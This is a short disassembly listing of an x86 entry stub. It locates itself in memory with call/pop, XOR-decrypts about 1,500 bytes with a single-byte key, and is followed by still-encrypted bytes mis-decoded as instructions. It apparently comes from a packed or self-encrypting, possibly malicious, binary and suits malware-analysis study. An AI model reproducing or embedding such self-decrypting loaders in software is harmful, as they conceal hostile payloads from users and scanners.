
start:
0x0097c724:	pusha	
0x0097c725:	call	0x0097c72a	; targets: 0x0097c72a(MAY)
0x0097c72a:	popl	%ebp	; from: 0x0097c725(MAY)
0x0097c72b:	subl	$0x6, %ebp
0x0097c731:	subl	$0x57c724, %ebp
0x0097c737:	jmp	0x0097c788	; targets: 0x0097c788(MAY)
0x0097c788:	jmp	0x0097c791	; targets: 0x0097c791(MAY)	; from: 0x0097c737(MAY)
0x0097c791:	movl	$0x57c724, %eax	; from: 0x0097c788(MAY)
0x0097c796:	addl	%ebp, %eax
0x0097c798:	addl	$0x93, %eax
0x0097c79e:	movl	$0x5bb, %ecx
0x0097c7a3:	movl	$0x432fcca9, %edx
0x0097c7a8:	xorb	%dl, (%eax)	; from: 0x0097c7ac(MAY)
0x0097c7aa:	incl	%eax
0x0097c7ab:	decl	%ecx
0x0097c7ac:	jne	0x0097c7a8	; targets: 0x0097c7b2(MAY), 0x0097c7a8(MAY)
0x0097c7b2:	jmp	0x0097c7bb	; targets: 0x0097c7bb(MAY)	; from: 0x0097c7ac(MAY)
0x0097c7bb:	andb	0x20(%edx), %ah	; from: 0x0097c7b2(MAY)
0x0097c7bf:	xchgl	%eax, %ebp
0x0097c7c0:	testl	$0x6828a9a9, %eax
0x0097c7c5:	pushl	%ecx
0x0097c7c6:	testl	$0x64aaa9a9, %eax
0x0097c7cb:	adcl	%esp, 0x13a9a9a9(%ecx)
0x0097c7d1:	subl	$0x282261aa, 0x4b5ea9a9(%ecx)
0x0097c7db:	movsl	%ds:(%esi), %es:(%edi)
0x0097c7dc:	testl	$0x6caaa9a9, %eax
0x0097c7e1:	stc	
0x0097c7e2:	stc	
0x0097c7e3:	rcll	$0xffffffed, (%ecx)
0x0097c7e6:	movsb	%ds:(%esi), %es:(%edi)
0x0097c7e7:	testl	$0xe32bc3c1, %eax
0x0097c7ec:	testl	$0xc18d85a8, %eax
0x0097c7f1:	lock movl	$0xac41d8eb, %ecx
0x0097c7f7:	testl	$0x8340a9a9, %eax
0x0097c7fc:	testl	$0x24fca9a9, %eax
